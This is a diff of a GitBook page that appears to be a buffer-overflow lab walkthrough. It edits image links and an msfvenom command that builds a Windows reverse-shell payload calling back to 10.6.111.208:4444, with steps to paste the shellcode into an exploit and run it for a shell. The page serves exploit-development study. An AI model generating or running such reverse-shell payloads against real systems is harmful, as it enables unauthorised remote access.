@@ -137,7 +137,7 @@ print()
 
 * I suggest using vim for this part as it will be easier to remove the bad chars in the coming steps
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (4).png" alt=""><figcaption></figcaption></figure>
 
 * Restart the program CTRL + SHIFT + F2
 * Start the program F9
@@ -328,11 +328,12 @@ Note the address: <mark style="color:yellow;">625011AF</mark>
 ### Msfvenom
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thread -b "\xaf\x11\x50\x62" -f c
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c
 ```
 
 1. Copy the shell code only
 2. Open the exploit and add the shellcode to the payload section
+3. <mark style="color:yellow;">Make sure that the EXITFUNC consists of the bad chars and not the RETN value</mark>
 
 <figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
@@ -349,7 +350,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 4. Go back to your exploit and run it
 5. You should have a shell
 
-
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 
 
